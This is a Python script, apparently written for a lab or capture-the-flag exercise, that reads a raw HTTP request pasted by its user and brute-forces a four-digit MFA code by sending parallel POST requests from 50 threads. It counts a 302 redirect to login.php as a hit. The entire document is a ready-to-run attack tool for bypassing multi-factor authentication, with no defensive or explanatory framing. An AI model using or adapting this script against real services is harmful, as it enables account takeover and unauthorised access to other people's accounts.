import re
import sys
import time
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, BarColumn, TimeRemainingColumn, TimeElapsedColumn, TextColumn

console = Console()

FOUND = False
TOTAL_TESTED = 0
START_TIME = time.time()
LOCK = Lock()


# ======================================================
#   PARSE RAW HTTP REQUEST
# ======================================================

def parse_http_request(raw_request: str):
    lines = raw_request.strip().split("\n")

    method, path, _ = lines[0].split()

    host_line = next((l for l in lines if l.lower().startswith("host:")), None)
    host = host_line.split(":", 1)[1].strip()

    url = f"http://{host}{path}"

    headers = {}
    cookies = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        line = line.strip()

        if line == "":
            is_body = True
            continue

        if not is_body:
            if ":" in line:
                k, v = line.split(":", 1)
                k = k.strip()
                v = v.strip()

                # DO NOT forward host/content-length again
                if k.lower() in ["host", "content-length"]:
                    continue

                if k.lower() == "cookie":
                    for c in v.split(";"):
                        ck, cv = c.strip().split("=", 1)
                        cookies[ck] = cv
                else:
                    headers[k] = v

        else:
            body += line

    return url, headers, cookies, body


# ======================================================
#   UPDATE CODE IN BODY
# ======================================================

def update_code(body_template: str, new_code: str):
    return re.sub(r"code=\d+", f"code={new_code}", body_template)


# ======================================================
#   SEND REQUEST FOR EACH CODE
# ======================================================

session = requests.Session()

def try_code(url, headers, cookies, body_template, code, progress_task, progress_bar):
    global FOUND, TOTAL_TESTED

    if FOUND:
        return None

    payload = update_code(body_template, code)

    try:
        r = session.post(
            url,
            data=payload,
            headers=headers,
            cookies=cookies,
            allow_redirects=False,
            timeout=2
        )

        # TRUE SUCCESS CONDITION (CONFIRMED FROM CURL)
        success = (
            r.status_code == 302 and
            "login.php" in r.headers.get("Location", "")
        )

    except Exception:
        success = False

    with LOCK:
        TOTAL_TESTED += 1
        progress_bar.update(progress_task, advance=1)

        if success:
            console.print(f"\n\n[bold green]🎯 VALID MFA CODE FOUND → {code}[/bold green]\n")
            FOUND = True
        else:
            console.print(
                f"[yellow]TRY[/yellow] {code} → [red]Invalid[/red]  "
                f"[cyan]Total Tested:[/cyan] {TOTAL_TESTED}",
                end="\r"
            )


# ======================================================
#   MAIN BRUTE FORCE CONTROLLER
# ======================================================

def start_bruteforce(raw_request):
    global START_TIME

    url, headers, cookies, body_template = parse_http_request(raw_request)

    console.print("\n[bold cyan]Parsed Request Summary:[/bold cyan]")
    console.print(f"[bold]URL:[/bold] {url}")
    console.print(f"[bold]Headers:[/bold] {headers}")
    console.print(f"[bold]Cookies:[/bold] {cookies}")
    console.print(f"[bold]Body Template:[/bold] {body_template}\n")

    console.print("[magenta]🚀 Starting 4-digit MFA brute force (1000 → 9999)…[/magenta]")
    console.print("[magenta]⚡ Using 50 worker threads[/magenta]\n")

    START_TIME = time.time()

    total_codes = 9000

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=60),
        TextColumn("[bold blue]{task.completed}/{task.total}[/bold blue]"),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console,
    ) as progress:

        task = progress.add_task("Brute-Forcing Codes...", total=total_codes)

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []

            for i in range(1000, 10000):
                if FOUND:
                    break

                code = f"{i:04d}"

                futures.append(
                    executor.submit(
                        try_code,
                        url,
                        headers,
                        cookies,
                        body_template,
                        code,
                        task,
                        progress
                    )
                )

            for _ in as_completed(futures):
                if FOUND:
                    break


# ======================================================
#   RUN SCRIPT
# ======================================================

if __name__ == "__main__":
    console.print("[bold cyan]Paste the full HTTP request below (Ctrl+D to finish):[/bold cyan]\n")
    raw_request = sys.stdin.read()
    start_bruteforce(raw_request)
